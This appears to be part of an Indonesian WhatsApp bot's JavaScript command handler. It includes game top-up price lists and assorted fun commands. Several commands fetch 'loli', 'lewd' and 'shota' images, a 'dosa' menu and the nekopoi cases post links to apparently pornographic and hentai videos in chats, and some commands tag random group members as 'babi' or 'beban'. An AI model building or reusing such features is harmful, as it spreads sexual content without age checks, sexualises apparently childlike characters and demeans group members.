*70 💎 Rp 9.174*
*100 💎 Rp 13.344*
*140 💎 Rp 18.348*
*210 💎 Rp 27.522*
*355 💎 Rp 45.870*
*500 💎 Rp 65.052*
*720 💎 Rp 91.740*
*1000 💎 Rp 130.104*
*2000 💎 Rp 250.200*
*4000 💎 Rp 500.400*

*Member Mingguan Rp 27.800*
*Member Bulanan Rp 139.000*

Note : 
• Harga sewaktu waktu berubah
• Pastikan ID Sudah benar
• Pemesanan lebih tinggal x kan saja
• Kesalahan Pengirim data tidak ada reff
`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "By Ndyie Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsuki.jpg'),sourceUrl:"OV1876"}}})
break

case 'pubg':
Ndyie.sendMessage(from, `
*DROP DATA UC PUBG*
• VIA ID
• LEGAL 100%
• PROSES 1-5 MENIT
• STOK UNLIMITED

*50 💸	Rp 9.390*
*100 💸	Rp 18.565*
*125 💸	Rp 22.740*
*150 💸	Rp 28.205*
*250 💸	Rp 45.950*
*500 💸	Rp 91.505*
*600 💸	Rp 100.330*
*700 💸	Rp 131.430*
*800 💸	Rp 149.680*
*1250 💸	Rp 230.230*
*1350 💸	Rp 260.180*
*1500 💸	Rp 275.205*
*2500 💸	Rp 455.205*
*3000 💸	Rp 540.680*
*3500 💸	Rp 625.180*
*4000 💸	Rp 719.180*
*5000 💸	Rp 920.180*
*7000 💸	Rp 1.329.980*

Note : 
• Harga sewaktu waktu berubah
• Pastikan ID Sudah benar
• Pemesanan lebih tinggal x kan saja
• Kesalahan Pengirim data tidak ada reff
`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "By Ndyie Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsuki.jpg'),sourceUrl:"OV1876"}}})
break

case 'ml':
Ndyie.sendMessage(from, `
*DROP DATA DIAMOND ML*
• VIA ID & SERVER
• LEGAL 100%
• PROSES 1-5 MENIT

*86 💎 Rp 18.748*
*172 💎 Rp 37.230*
*257 💎 Rp 56.283*
*344 💎 Rp 75.336*
*429 💎 Rp 93.951*
*514 💎 Rp 112.566*
*600 💎 Rp 131.400*
*706 💎 Rp 154.614*
*878 💎 Rp 192.282*
*963 💎 Rp 210.897*
*1412 💎 Rp 300.756*
*2195 💎 Rp 452.170*
*3688 💎 Rp 748.664*
*4394 💎 Rp 891.982*
*5532 💎 Rp 1.122.996*
*9288 💎 Rp 1.885.464*

*Starlight Membership Bonus 12 💎 Rp 95.000*
*Twilight Pass [PROMO ]  Rp 95.000*
*Starlight Membership  Rp 127.000*
*Twilight  Rp 127.000*
*Starlight Membership Plus [PROMO ] Rp 240.000*
*Mobile Legend Member Plus Rp 285.000*
`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "By Ndyie Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsuki.jpg'),sourceUrl:"OV1876"}}})
break

case 'chip':
Ndyie.sendMessage(from, `
Note : 
• Harga sewaktu waktu berubah
• Pastikan ID & Server Sudah benar
• Pemesanan lebih tinggal x kan saja
• Kesalahan Pengirim data tidak ada reff

*DROP DATA CHIP*
• VIA ID + NICK
• LEGAL 100%
• PROSES 1-5 MENIT
• STOK UNLIMITED

*10M Koin Emas-D Rp 2.500*
*15M Koin Emas-D Rp 3.000*
*30M Koin Emas-D Rp 5.000*
*60M Koin Emas-D Rp 8.000*
*100M Koin Emas-D Rp 13.000*
*200M Koin Emas-D Rp 20.000*
*400M Koin Emas-D Rp 39.000*
*600M Koin Emas-D Rp 56.000*
*1B Koin Emas-D Rp 69.000*
*2B Koin Emas-D Rp 138.000*
*3B Koin Emas-D Rp 207.000*
*4B Koin Emas-D Rp 276.000*
*5B Koin Emas-D Rp 345.000*
*6B Koin Emas-D Rp 414.000*
*7B Koin Emas-D Rp 483.000*

Note : 
• Harga sewaktu waktu berubah
• Pastikan ID Sudah benar
• Pemesanan lebih tinggal x kan saja
• Kesalahan Pengirim data tidak ada reff
`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "By Ndyie Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsuki.jpg'),sourceUrl:"OV1876"}}})
break




//━━━━━━━━━━━━━━━[ ISI PAKE CASE/FITUR LU ]━━━━━━━━━━━━━━━\\                                              
case 'donasi':
               list = []
               listmenu = [`dana`,`ovo`,`gopay`]
               listmenuu = [`Dana`,`Ovo`,`Gopay`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'silahkan pilih menunya ' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `${ucapanWaktu}`,  `Hai kak......\n*${pushname}*\nPilih Disini`, list)
               break
case 'dana':
             reply(`DANA : ${dana}\n\n Ndyie`)
             break  
       case 'gopay': 
       reply(`GOPAY : ${gopay}\n\n Ndyie`)
     break
     case 'ovo':
     reply(`OVO : ${ovo}\n\n Ndyie`)
     break               
     
//━━━━━━━━━━━━━━━[ maker ]━━━━━━━━━━━━━━━━━//
case "loliteks":
apinya = `https://api.clph.me/api/loli?apikey=${caliphAPI}`
buffer = await getBuffer(apinya)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, caption: 'Nih kak lolinya' })
break
case "lewd":
apinya = `https://api.clph.me/api/lewd?apikey=${caliphAPI}`
buffer = await getBuffer(apinya)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, caption: 'Nih kak lewdnya' })
break
case "lolimaker":
if (args.length < 1) return reply(`Teksnya mana?`)
hasil = await getBuffer(`https://api.clph.me/api/lolimaker?apikey=${caliphAPI}&text=${encodeURIComponent(args.join(' '))}`)
Ndyie.sendMessage(from, hasil, image, { quoted: Nia, caption: `Nih Kak logo lolinya...` })
break
case "remlogo":
if (!args.join(' ')) return reply(`Teksnya mana?`)
hasil = await getBuffer(`https://api.clph.me/api/rem?apikey=${caliphAPI}&text=${encodeURIComponent(args.join(' '))}`)
Ndyie.sendMessage(from, hasil, image, { quoted: Nia, caption: `Nih Kak logo remnya...` })
break
case "kanekilogo":
if (!args.join(' ')) return reply(`Teksnya mana?`)
hasil = await getBuffer(`https://api.clph.me/api/kaneki?apikey=${caliphAPI}&text=${encodeURIComponent(args.join(' '))}`)
Ndyie.sendMessage(from, hasil, image, { quoted: Nia, caption: `Nih Kak logo kanekinya...` })
break
           

//━━━━━━━━━━━━━━━[ Dosa Menu ]━━━━━━━━━━━━━━━━━//
case 'dosa1':				 
qute = fs.readFileSync('./itsuki.jpg') 
Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
break
case 'dosa2':
qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })

break

case 'dosa3':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    

break

case 'dosa4':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   

break

case 'dosa5':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   

break

case 'dosa6':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })				   

break

case 'dosa7':

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })				   

break

case 'dosa8':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })				   

break

case 'dosa10':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })				   

break

case 'dosa11':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })				   

break

case 'dosa12':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })				   

break

case 'dosa13':	

qute = fs.readFileSync('./itsuki.jpg') 

Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })				   

break
case 'dosa14':	
qute = fs.readFileSync('./itsuki.jpg') 
Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })				   
break
case 'dosa15':
qute = fs.readFileSync('./itsuki.jpg') 
Ndyie.sendMessage(from, qute, image, { quoted: ftrol, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })				   
break


//━━━━━━━━━━━━━━━[ Nekopai Menu ]━━━━━━━━━━━━━━━━━//
			   case 'nekopoi1':
			   reply('Mode Sange!!..')
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi2':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi3':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi4':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi5':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi6':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi7':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi8':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_HiNiaishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi9':
                 reply('Mode Sange!!..')
                 
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                Ndyie.sendMessage(from, fcrew, MessageType.image, {quoted: Nia, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break


//━━━━━━━━━━━━━━━[ Random Menu ]━━━━━━━━━━━━━━━\\
       case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
       case 'mining':
              var mining = randomNomor(1000)
              atm.addKoinUser(sender, mining, _uang)
              await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              break
       case 'waktu':
              reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              break
        case 'citacita':
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              Ndyie.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: Nia})
              break
       case 'apakah':
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','YNTKS','Mungkin','Mungkin Iya','Mungkin Tidak','MANA GW TAU']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: Nia })
              break
       case 'rate':
       case 'nilai':
              rate = body.slice(1)
              const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
              const te = ra[Math.floor(Math.random() * ra.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: Nia })
              break
       case 'gantengcek':
       case 'cekganteng':
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: Nia })
              break
       case 'cantikcek':
       case 'cekcantik':
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: Nia })
              break
       case 'cekwatak':
              var namao = pushname
              var prfx = await Ndyie.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','ColNia','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
       case 'hobby':
              hobby = body.slice(1)
              const by = hobby[Math.floor(Math.random() * hobby.length)]
              Ndyie.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: Nia })
              break
       case 'bisakah':
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU','YNTKS','Mungkin','Mungkin Bisa','Mungkin Tidak','Coba Ulangi']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: Nia })
              break
       case 'kapankah':
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              Ndyie.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: Nia })
              break
       case 'jadian':
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
       case 'cantik':
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              break
       case 'ganteng':
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
       case 'babi':
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break           



//━━━━━━━━━━━━━━━[ FITUR OTHER ]━━━━━━━━━━━━━━━━━//
case "on":
        if (!isOwner && !Nia.key.fromMe) return reply(mess.own)
        offline = false;
        reply(" ```ANDA TELAH ONLINE``` ");
        break;
        case "off":
        if (!isOwner && !Nia.key.fromMe) return reply(mess.own)
        offline = true;
        waktu = Date.now();
        anuu = q ? q : "-";
        alasan = anuu;
        reply(" ```ANDA TELAH OFFLINE``` ");
        break;         
     
     
//━━━━━━━━━━━━━━━[ Random Menu ]━━━━━━━━━━━━━━━[//
case  'fakta': 
reply(mess.wait)
buffer = await getBuffer(`https://melcanz.com/fakta?apikey={RendyAPI}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'kanna': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/kanna?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
break
case  'neko2': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/neko?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'waifu': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/waifu?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'husbu': 
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/husbu?apikey=${cikoapi}`)
Ndyie.sendMessage(from, buffer, image, { quoted: Nia, thumbnail: fs.readFileSync('./itsuki.jpg')})
break
case  'shota': 
reply(mess.wait)
